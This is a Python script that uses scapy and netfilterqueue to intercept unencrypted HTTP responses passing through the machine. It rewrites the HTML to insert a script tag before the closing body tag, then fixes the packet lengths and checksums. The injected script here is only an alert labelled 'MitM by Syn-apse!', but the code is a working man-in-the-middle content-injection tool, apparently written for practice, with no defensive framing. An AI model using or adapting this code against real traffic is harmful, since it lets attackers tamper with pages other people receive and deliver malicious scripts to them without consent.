import scapy.all as scapy
import traceback # Import the traceback module for detailed errors
import netfilterqueue

INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"

def process_packet(packet):
    try:
        print("\n--- [1] Packet Received by Queue ---")
        scapy_packet = scapy.IP(packet.get_payload())
        print("[2] Packet Parsed by Scapy. Summary:", scapy_packet.summary())

        modified = False
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].sport == 80:
                print("[3] HTTP Response Detected.")
                # Make sure the payload is bytes before checking for bytes
                if isinstance(scapy_packet[scapy.Raw].load, bytes) and b"</body>" in scapy_packet[scapy.Raw].load:
                    print("[4] HTML Body Found. Injecting script...")
                    
                    load = scapy_packet[scapy.Raw].load
                    modified_load = load.replace(b"</body>", INJECTION_SCRIPT + b"</body>")
                    scapy_packet[scapy.Raw].load = modified_load
                    
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
                    modified = True
        
        print(f"[5] Packet processed. Modified: {modified}. Releasing from queue...")
        packet.accept()
        print("[6] Packet Accepted by Kernel.")

    except Exception:
        # If ANY error occurs, print the full traceback and still accept the packet
        print("\n[!!!] CRITICAL ERROR IN process_packet [!!!]")
        traceback.print_exc()
        packet.accept() # Accept the packet anyway to keep the connection alive

def start():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    print("[*] Packet modifier started. Waiting for traffic...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down packet modifier.")
        queue.unbind()

